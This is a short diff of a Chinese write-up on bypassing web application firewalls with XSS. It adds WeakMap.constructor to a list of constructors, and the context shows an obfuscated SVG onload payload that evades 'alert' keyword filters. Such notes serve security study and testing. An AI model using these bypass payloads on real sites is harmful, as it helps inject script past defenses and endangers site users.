@@ -246,7 +246,7 @@ waf拦截
 
 ![35](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yl50p5ykj30uj09at9g.jpg)
  
-总结起来就是`Set.constructor` `Map.constructor` `clear.constructor` `Array.constructor` `WeakSet.constructor` (注意区分大小写的)
+总结起来就是`Set.constructor` `Map.constructor` `clear.constructor` `Array.constructor` `WeakSet.constructor` `WeakMap.constructor`(注意区分大小写的)
 
 ```
 <svg/onload=Set.constructor`al\x65rt\x28/xss/\x29```>
